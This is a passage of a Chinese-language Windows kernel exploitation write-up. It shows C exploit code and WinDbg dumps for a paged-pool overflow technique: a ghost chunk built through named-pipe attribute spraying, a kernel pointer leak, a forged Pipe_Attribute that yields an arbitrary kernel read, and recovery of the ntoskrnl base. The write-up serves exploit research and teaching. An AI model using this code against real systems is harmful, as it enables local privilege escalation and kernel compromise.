       +0x008 AllocatorBackTraceIndex : 0xffe8
       +0x00a PoolTagHash      : 0xffff
从上图我们可以看到，相邻块的POOL_HEADER中PreviousSize和PoolType已经被修改，且PoolType的CacheAligned位被设置，那么从原作者的文章中我们可以了解到，当一个块的PoolType的CacheAligned位被设置，那么在释放这个块时，它将尝试寻找原始的块地址，以便正确的释放此块。
原始块地址计算方法如下：
    if ( AlignedHeader ->PoolType & 4 )
    {
        OriginalHeader = (QWORD)AlignedHeader - AlignedHeader ->PreviousSize * 0x10;
        OriginalHeader ->PoolType |= 4;
    }
由上面的调试可知，原始的块地址为：`ffffb80008cfb570 - 0x15 * 0x10 = ffffb80008cfb420`
通过释放相邻块，即可触发对幽灵块的释放，所以我们将会得到一个大小为0x210的空闲堆。
## 3\. 申请幽灵块
对相邻块进行释放，即可得到一个空闲的大小为0x210的幽灵块
    spray_pipes(xploit->lookaside1);
    sleep(2);
    spray_pipes(xploit->lookaside2);
    sleep(1);
    free_pipes(spray1);
    free_pipes(spray2);//这里对相邻块进行了释放
    printf("[+] Alloc ghost !\n");
    xploit->alloc_ghost_chunk(xploit, attribute);//通过给管道设置属性，来申请刚刚释放的幽灵块。
申请到的幽灵块如下
    0: kd> dq ffffb80008cfb3e0
    ffffb800`08cfb3e0  7441704e`03190000 ffffffff`ffffffff //这里是通过respray重新占用的漏洞块的POOL_HEADER,大小为0x190
    ffffb800`08cfb3f0  ffffb800`09109830 ffffb800`09109830
    ffffb800`08cfb400  ffffb800`08cfb418 00000000`00000156
    ffffb800`08cfb410  ffffb800`08cfb41a 42424242`4242005a
    ffffb800`08cfb420  7441704e`03210000 42424242`42424242 //这里是幽灵块，大小为0x210
    ffffb800`08cfb430  ffffb800`0885a190 ffffb800`0885a190
    ffffb800`08cfb440  ffffb800`08cfb458 00000000`000001d6
    ffffb800`08cfb450  ffffb800`08cfb45a 43434343`4343005a
    0: kd> dt nt!_POOL_HEADER ffffb800`08cfb420
       +0x000 PreviousSize     : 0y00000000 (0)
       +0x000 PoolIndex        : 0y00000000 (0)
       +0x002 BlockSize        : 0y00100001 (0x21)
       +0x002 PoolType         : 0y00000011 (0x3)
       +0x000 Ulong1           : 0x3210000
       +0x004 PoolTag          : 0x7441704e
       +0x008 ProcessBilled    : 0x42424242`42424242 _EPROCESS
       +0x008 AllocatorBackTraceIndex : 0x4242
       +0x00a PoolTagHash      : 0x4242
    0: kd> dq ffffb800`08cfb420
    ffffb800`08cfb420  7441704e`03210000 42424242`42424242
    ffffb800`08cfb430  ffffb800`0885a190 ffffb800`0885a190
    ffffb800`08cfb440  ffffb800`08cfb458 00000000`000001d6
    ffffb800`08cfb450  ffffb800`08cfb45a 43434343`4343005a
    ffffb800`08cfb460  43434343`43434343 43434343`43434343
    ffffb800`08cfb470  43434343`43434343 43434343`43434343
    ffffb800`08cfb480  43434343`43434343 43434343`43434343
    ffffb800`08cfb490  43434343`43434343 43434343`43434343
从上图我们可以发现，实际上，通过上面的操作，漏洞块和幽灵块共享了同一部分内存，也就是从漏洞块POOL_HEADER处偏移0x40的位置开始，漏洞块和幽灵块共享了0x150大小的内存。
## 4\. 信息泄露
    if (!xploit->get_leak(xploit, xploit->respray))
            return 0;
    int get_leak(xploit_t * xploit, pipe_spray_t * respray)
    {
        char leak[0x1000] = {0};
        //#define ATTRIBUTE_NAME      "Z"
        xploit->leak_offset = xploit->targeted_vuln_size + xploit->offset_to_pool_header - xploit->backward_step - xploit->struct_header_size - ATTRIBUTE_NAME_LEN; //leak_offset=0x6
        LOG_DEBUG("Leak offset is 0x%X", xploit->leak_offset);
        // leak the data contained in ghost chunk
        xploit->leaking_pipe_idx = read_pipes(respray, leak);//int read_pipes(pipe_spray_t * pipe_spray, char * leak)
        if (xploit->leaking_pipe_idx == -1)
        {
            if (xploit->backend == LFH)
                fprintf(stderr, "[-] Reading pipes found no leak :(\n");
            else
                LOG_DEBUG("Reading pipes found no leak");
            return 0;
        }
        LOG_DEBUG("Pipe %d of respray leaked data !", xploit->leaking_pipe_idx);
        // leak pipe attribute structure !
        xploit->leak_root_attribute = *(uintptr_t *)((char *)leak + xploit->leak_offset + 0x10); // list.next
        xploit->leak_attribute_name = *(uintptr_t *)((char *)leak + xploit->leak_offset + 0x20); // AttributeName
        // 0x10 is POOL_HEADER
        xploit->ghost_chunk = xploit->leak_attribute_name - LEN_OF_PIPE_ATTRIBUTE_STRUCT - POOL_HEADER_SIZE;
        printf("[+] xploit->leak_root_attribute ptr is 0x%llX\n", xploit->leak_root_attribute);
        printf("[+] xploit->ghost_chunk         ptr is 0x%llX\n", xploit->ghost_chunk);
        return 1;
    }
目前我们已经构造出漏洞块和幽灵块共享同一块内存的局面，且我们准确的知道幽灵块与漏洞块的偏移值。所以实际上可以通过NtFsControlFile来获取漏洞块的属性值，那么实际获取到的其实是幽灵块的Pipe_Attribute结构的值。因为在后面的利用中，我们要给幽灵块伪造一个Fake_Pipe_Attribute，同时在利用结束后，需要恢复幽灵块的Pipe_Attribute的原始值，以防蓝屏，所以这里要对原始的Pipe_Attribute值进行保存。
## 5\. 幽灵块设置Fake_Pipe_Attribute
因为幽灵块和漏洞块共享同一块内存，所以要修改幽灵块的Pipe_Attribute，实际只需要修改漏洞块的Pipe_Attribute值即可。
    xploit->setup_ghost_overwrite(xploit, rewrite_buf);
    xploit->rewrite = prepare_pipes(SPRAY_SIZE * 4, xploit->targeted_vuln_size + POOL_HEADER_SIZE, rewrite_buf, xploit->spray_type);
    close_pipe(&xploit->respray->pipes[xploit->leaking_pipe_idx]);//释放漏洞块
    spray_pipes(xploit->rewrite);//再次占用漏洞块
    void setup_ghost_overwrite(xploit_t * xploit, char * ghost_overwrite_buf)
    {
        pipe_attribute_t  * overwritten_pipe_attribute;
        strcpy(ghost_overwrite_buf, ATTRIBUTE_NAME);
        overwritten_pipe_attribute = (pipe_attribute_t*)((char *)ghost_overwrite_buf + xploit->ghost_chunk_offset + POOL_HEADER_SIZE);
        // 使指向下一个属性的指针在用户层
        overwritten_pipe_attribute->list.Flink = (LIST_ENTRY *)xploit->fake_pipe_attribute;
        // 虚拟值，必须在退出前修复它以避免崩溃
        overwritten_pipe_attribute->list.Blink = (LIST_ENTRY *)0xDEADBEEFCAFEB00B;
        // 将属性名设置为一个错误的值，这样当我们试图从这里读取和属性时，就永远找不到它，所以它总是会去下一个指向userland的属性
        overwritten_pipe_attribute->AttributeName = DUMB_ATTRIBUTE_NAME;
        overwritten_pipe_attribute->ValueSize = 0x1;
        overwritten_pipe_attribute->AttributeValue = DUMB_ATTRIBUTE_NAME;
    }
修改后的幽灵块的Pipe_Attribute
    0: kd> dq ffffb80008cfb3e0 //这里是被rewrite再次占用的幽灵块
    ffffb800`08cfb3e0  7441704e`03190000 ffffffff`ffffffff
    ffffb800`08cfb3f0  ffffb800`0906fbb0 ffffb800`0906fbb0
    ffffb800`08cfb400  ffffb800`08cfb418 00000000`00000156
    ffffb800`08cfb410  ffffb800`08cfb41a 45454545`4545005a
    ffffb800`08cfb420  45454545`45454545 45454545`45454545 //幽灵块的Pipe_Attribute已经被成功修改。
    ffffb800`08cfb430  00000000`00bd1440 deadbeef`cafeb00b //List_next已经被修改为指向用户层的Fake_Pipe_Attribute的指针
    ffffb800`08cfb440  00000000`0040e85c 00000000`00000001
    ffffb800`08cfb450  00000000`0040e85c 45454545`45454545
## 6\. 任意地址读原语
经过上面第五步的操作，实际上我们已经获得了一个任意地址读原语。
在第五步的操作中，我们将幽灵块的Pipe_Attribute进行了修改，Pipe_Attribute的结构如下。
    //PipeAttribute是未公开的结构体
    struct PipeAttribute {
    LIST_ENTRY list;
    char * AttributeName;
    uint64_t AttributeValueSize ;
    char * AttributeValue ;
    char data [0];
    };
有一个已知的情况是，分页池创建管道后，用户可以向管道添加属性，同时属性值分配的大小和填充的数据完全由用户来控制。
AttributeName和AttributeValue是指向数据区不同偏移的两个指针。
同时在用户层，可以使用0x110038控制码来读取属性值。AttributeValue指针和AttributeValueSize大小将被用于读取属性值并返回给用户。
属性值可以被修改，但这会触发先前的PipeAttribute的释放和新的PipeAttribute的分配。
这意味着如果攻击者可以控制PipeAttribute结构体的AttributeValue和AttributeValueSize字段，它就可以在内核中任意读取数据，但不能任意写。
所以，现在我们控制了幽灵块中Pipe_Attribute的List_next指针值，使其指向用户层的Pipe_Attribute，也就意味着用户层的PipeAttribute结构体的AttributeValue和AttributeValueSize字段我们可以任意指定，也就可以在内核中任意读取数据数据，即获得了一个任意地址读原语。
## 7\. 获取kernel_base
    void find_kernel_base(xploit_t * xploit)
    {
        uintptr_t file_object_ptr = 0;
        uintptr_t file_object;
        uintptr_t device_object;
        uintptr_t driver_object;
        uintptr_t NpFsdCreate;
        file_object_ptr = xploit->find_file_object(xploit);
        // Get the leak of ntoskrnl and npfs
        exploit_arbitrary_read(xploit, file_object_ptr, (char *)&file_object, 0x8);//文件对象
        printf("[+] File object is : 0x%llx\n", file_object);
        exploit_arbitrary_read(xploit, file_object+8, (char *)&device_object, 0x8);//设备对象
        printf("[+] Device object is : 0x%llx\n", device_object);
        exploit_arbitrary_read(xploit, device_object+8,(char *)&driver_object, 0x8);//驱动对象
        printf("[+] Driver object is : 0x%llx\n", driver_object);
        exploit_arbitrary_read(xploit, driver_object+0x70, (char *)&NpFsdCreate, 0x8);//驱动的第一个派遣函数
        printf("[+] Major function is : 0x%llx\n", NpFsdCreate);
        uintptr_t ExAllocatePoolWithTag_ptr = NpFsdCreate - NPFS_NPFSDCREATE_OFFSET + NPFS_GOT_ALLOCATEPOOLWITHTAG_OFFSET;//通过驱动派遣函数先获取到该驱动的基址，然后加上ExAllocatePoolWithTag函数在该驱动的导入表的偏移
        uintptr_t ExAllocatePoolWithTag;
        exploit_arbitrary_read(xploit, ExAllocatePoolWithTag_ptr, (char *)&ExAllocatePoolWithTag, 0x8);//从导入表中获取ExAllocatePoolWithTag函数的实际地址
        printf("[+] ExAllocatePoolWithTag is : 0x%llx\n", ExAllocatePoolWithTag);
        xploit->kernel_base =  ExAllocatePoolWithTag - NT_ALLOCATEPOOLWITHTAG_OFFSET;//ExAllocatePoolWithTag函数的地址减去nt中的偏移，就拿到了nt的基址
    }